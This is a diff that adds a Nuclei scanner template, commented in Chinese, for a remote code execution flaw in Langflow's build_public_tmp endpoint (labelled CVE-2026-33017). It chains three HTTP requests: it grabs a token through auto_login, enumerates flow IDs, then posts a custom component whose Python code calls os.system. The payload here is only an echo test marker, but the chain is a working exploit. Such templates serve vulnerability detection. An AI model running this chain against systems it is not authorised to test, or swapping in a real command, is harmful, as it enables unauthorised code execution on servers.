@@ -1,0 +1,81 @@
+id: CVE-2026-33017-langflow-rce-auto
+
+info:
+  name: "Langflow build_public_tmp 接口远程代码执行漏洞"
+  author: 0day5
+  severity: critical
+  description: |
+    自动获取 token + 枚举 flow_id + 利用 build_public_tmp 接口触发 RCE
+  tags: langflow
+
+http:
+  - raw:
+      # 1. 获取 token（AUTO_LOGIN 场景）
+      - |
+        GET /api/v1/auto_login HTTP/1.1
+        Host: {{Hostname}}
+
+      # 2. 获取 flows
+      - |
+        GET /api/v1/flows/ HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{token}}
+
+      # 3. 利用 flow_id
+      - |
+        POST /api/v1/build_public_tmp/{{flow_id}}/flow HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+
+        {
+          "data": {
+            "nodes": [
+              {
+                "id": "1",
+                "type": "genericNode",
+                "data": {
+                  "type": "CustomComponent",
+                  "node": {
+                    "template": {
+                      "_type": "CustomComponent",
+                      "code": {
+                        "value": "from langflow.custom import Component\n_r=__import__('os').system('echo nuclei_test')",
+                        "type": "code"
+                      }
+                    }
+                  }
+                }
+              }
+            ],
+            "edges": []
+          }
+        }
+
+    cookie-reuse: true
+    req-condition: true
+
+    extractors:
+      # 提取 token
+      - type: json
+        name: token
+        internal: true
+        json:
+          - ".access_token"
+
+      # 提取 flow_id（取第一个）
+      - type: regex
+        name: flow_id
+        internal: true
+        regex:
+          - '"id"\s*:\s*"([a-f0-9\-]{36})"'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200, 201]
+
+      - type: word
+        part: body
+        words:
+          - "job_id"
